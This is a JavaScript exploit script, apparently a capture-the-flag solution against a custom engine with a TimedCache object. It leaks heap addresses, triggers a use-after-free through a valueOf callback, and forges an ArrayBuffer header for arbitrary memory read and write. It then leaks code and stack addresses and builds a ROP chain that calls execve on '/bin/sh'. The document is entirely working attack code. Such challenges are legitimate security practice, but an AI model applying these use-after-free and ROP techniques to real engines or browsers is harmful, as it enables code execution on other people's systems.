// leak object addr
var arr1 = new ArrayBuffer(0x300);
var arr2 = new ArrayBuffer(0x300);
info_arr1 = console.debug(arr1);
console.log(info_arr1);
var addr_arr1 = BigInt(info_arr1.substring(32, 46)) - 0x28n;
var method_addr_arr1 = BigInt(info_arr1.substring(58, 72));

// trigger the UAF
var overlap;
var fake_expire_time = { 1: 2 };
fake_expire_time.valueOf = function () {
  console.sleep(2000);
  console.collectGarbage();
  overlap = new ArrayBuffer(0x150);
  //{1:{}}                             {1:{}}
  //^    ^  <-- Array Buffer Data         ^^ <-- Array Header
  return -1;
};
var tc = new TimedCache();
tc.set("first", { 1: {} }, 1000);
var info_first = console.debug(tc.get("first"));
console.log(info_first);
var freed_obj = tc.get("first", fake_expire_time);
console.log(console.debug(overlap));

// leak code_addr stack_addr
var view = new DataView(overlap);
var addr_first = BigInt(info_first.substring(32, 46)) - 0x28n;
var method_addr = BigInt(info_first.substring(58, 72));
function set64(view, idx, value) {
  view.setBigUint64(idx, value, true);
}
var leak_addr = addr_first + 0x100n;
set64(view, 0x28, leak_addr + 2n); //addr+2
set64(view, 6 * 8, leak_addr); //addr
set64(view, 7 * 8, 0x300n);
set64(view, 8 * 8, 0x300n);
set64(view, 9 * 8, 0x300n);
set64(view, 10 * 8, 0x301n); 
set64(view, 14 * 8, leak_addr); //addr
set64(view, 15 * 8, 0x300n);
set64(view, 16 * 8, 0x300n);
set64(view, 17 * 8, method_addr_arr1); //method

console.log(console.debug(freed_obj));
var view_anywhere = new DataView(freed_obj);
function get64(view, idx) {
  return view.getBigUint64(idx, true);
}
var code_addr = get64(view_anywhere, 0x10 + 0x80) - 0x11c9db0n;
var stack_addr = get64(view_anywhere, 0x60 + 0x80);
var filed2 = get64(view_anywhere, 0x148 + 0x80);
console.log(code_addr);
console.log(stack_addr);

// restore header
set64(view, 11 * 8, stack_addr + 0xc570n + 0x208n); // 3 stack addr
set64(view, 12 * 8, stack_addr + 0xc570n);
set64(view, 13 * 8, stack_addr + 0xc570n);
set64(view, 19 * 8, code_addr + 0xec5200n);
set64(view, 23 * 8, code_addr + 0xec5200n);
set64(view, 30 * 8, code_addr + 0xec5200n);
set64(view, 36 * 8, method_addr + 0x4ec00n);
set64(view, 38 * 8, code_addr + 0xec5200n);
set64(view, 41 * 8, filed2);

// ret * n and ROP
var ret = code_addr + 0xc09885n;
var stack_addr_rop = stack_addr + 0x18170n;
var stack_addr_rop = stack_addr_rop - (stack_addr_rop % 0x100n);
set64(view, 0x28, stack_addr_rop + 2n);
set64(view, 6 * 8, stack_addr_rop);
for (var i = 0; i < 80; i++) {
  set64(view_anywhere, i * 8, ret);
}

var pop_rax = code_addr + 0x12d4d6n;
var pop_rdi = code_addr + 0x12bbean;
var pop_rsi = code_addr + 0x12bc8cn;
var pop_rdx = code_addr + 0x27e18en;
var syscall = code_addr + 0x140493n;

set64(view_anywhere, 80 * 8, pop_rdi);
set64(view_anywhere, 81 * 8, stack_addr_rop + 89n * 8n);
set64(view_anywhere, 82 * 8, pop_rsi);
set64(view_anywhere, 83 * 8, 0x0n);
set64(view_anywhere, 84 * 8, pop_rdx);
set64(view_anywhere, 85 * 8, 0x0n);
set64(view_anywhere, 86 * 8, pop_rax);
set64(view_anywhere, 87 * 8, 0x3bn);
set64(view_anywhere, 88 * 8, syscall);
set64(view_anywhere, 89 * 8, 0x0068732f6e69622fn); // "/bin/sh\x00"
//console.sysbreak();
